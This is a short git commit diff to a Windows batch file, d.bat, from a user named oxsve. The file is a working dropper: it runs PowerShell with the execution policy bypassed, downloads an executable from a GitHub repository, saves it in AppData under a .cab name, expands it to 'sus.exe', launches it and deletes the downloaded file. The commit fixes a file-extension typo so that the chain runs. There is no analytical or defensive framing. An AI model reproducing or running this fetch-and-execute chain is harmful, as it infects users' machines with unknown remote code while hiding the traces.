46a1a2e74f7a207bf364287e3ff62b03ba197093
oxsve <46594689+oxsve@users.noreply.github.com>
2021-02-16 19:37:21 +0300

    Update d.bat

--- d.bat
+++ d.bat
@@ -1,4 +1,4 @@
-call powershell.exe -ExecutionPolicy bypass -noprofile (New-Object System.Net.WebClient).DownloadFile('https://github.com/oxsve/f/blob/master/ghlq.exe','%AppData%\z.cap')
+call powershell.exe -ExecutionPolicy bypass -noprofile (New-Object System.Net.WebClient).DownloadFile('https://github.com/oxsve/f/blob/master/ghlq.exe','%AppData%\z.cab')
 call expand %AppData%\z.cab %AppData%\sus.exe
 call start %AppData%\sus.exe
 call del %AppData%\z.cab
